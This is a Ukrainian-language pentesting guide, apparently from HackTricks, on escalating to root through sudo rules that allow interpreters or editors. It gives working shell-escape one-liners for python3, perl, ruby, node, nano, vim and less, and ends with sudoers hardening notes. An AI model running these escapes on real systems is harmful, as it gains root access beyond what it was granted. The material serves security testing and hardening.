# Зловживання командами Sudo

## Інтерпретатори, дозволені Sudo

Якщо `sudo -l` дозволяє користувачу запускати інтерпретатор від імені root, розглядайте це як безпосереднє виконання коду. Інтерпретатори призначені для виконання довільного коду, тому правило, яке дозволяє запускати `python3`, `perl`, `ruby`, `lua`, `node` або подібні бінарні файли, зазвичай еквівалентне виконанню команд від імені root, якщо аргументи не мають жорстких обмежень і не проходять перевірку.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Поширений порядок перевірки: спочатку перелічіть привілеї користувача, а потім виконайте інструкцію Python за допомогою параметра інтерпретатора `-c`.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Інші приклади інтерпретаторів наведено нижче; перелічені інтерпретатори документують виконання inline-коду або API дочірніх процесів.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Точний шлях має значення. Якщо правило sudo дозволяє `/usr/bin/python3`, під час перевірки використовуйте саме цей шлях.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Редактори, дозволені через Sudo

Якщо `sudo -l` дозволяє користувачу запускати інтерактивний редактор від імені root, розглядайте це як поверхню виконання команд, а не як безпечний дозвіл на редагування файлів. Редактори часто можуть виконувати shell-команди, читати довільні файли, записувати довільні файли або викликати зовнішні helper-и безпосередньо з редактора.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Типовий процес перевірки: переглянути привілеї користувача, а потім запустити кожен дозволений редактор або pager через sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Виконання команд у Nano

Якщо запуск `nano` дозволено через sudo, виконання команд може бути доступним з інтерфейсу редактора.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Потім введіть команду, наприклад `id` або `/bin/sh`, у командний рядок nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Якщо інтерактивна shell не має придатних для використання термінальних потоків, ця форма перенаправлення відображає її стандартний вивід і помилки на дескриптор 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Точна послідовність клавіш може відрізнятися залежно від версії nano та параметрів збірки, але проблема безпеки залишається тією самою: редактор працює від імені root і може викликати зовнішні команди.<sup>[[1]](#references)[[12]](#references)</sup>

### Інші поширені способи виходу з редактора

Редактори у стилі Vim зазвичай надають доступ до виконання команд через `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Пейджери, такі як `less`, також можуть надати доступ до виконання команд оболонки.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Захисні примітки

- Уникайте надання інтерпретаторів або інтерактивних редакторів через sudo.<sup>[[1]](#references)</sup>
- Надавайте перевагу фіксованим обгорткам, власником яких є root, що виконують одну вузьку адміністративну дію.<sup>[[1]](#references)[[2]](#references)</sup>
- Якщо інтерпретатор неминучий, обмежте точний шлях до скрипту та забороніть контрольовані користувачем аргументи, доступні для запису імпорти, `PYTHONPATH` і небезпечне збереження середовища.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Якщо потрібне редагування файлів, обмежте точний шлях до файлу та розгляньте використання `sudoedit` із виправленими версіями sudo і суворим керуванням середовищем.<sup>[[1]](#references)[[2]](#references)</sup>
- Перевіряйте `SETENV`, `env_keep`, доступні для запису робочі каталоги, доступні для запису шляхи модулів/імпорту, `NOEXEC`, `use_pty` і журналювання, але не вважайте їх повноцінним sandbox.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Командний рядок і середовище — документація Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — різноманітні інтерфейси операційної системи — документація Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — як виконати інтерпретатор Perl](https://perldoc.perl.org/perlrun)
- [6] [exec — документація Perl](https://perldoc.perl.org/functions/exec)
- [7] [Параметри командного рядка Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — документація Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [API командного рядка — документація Node.js](https://nodejs.org/api/cli.html)
- [10] [Дочірній процес — документація Node.js](https://nodejs.org/api/child_process.html)
- [11] [Сторінка посібника lua для Lua 5.4](https://www.lua.org/manual/5.4/lua.html)
- [12] [Текстовий редактор GNU nano](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Перенаправлення — довідковий посібник Bash](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
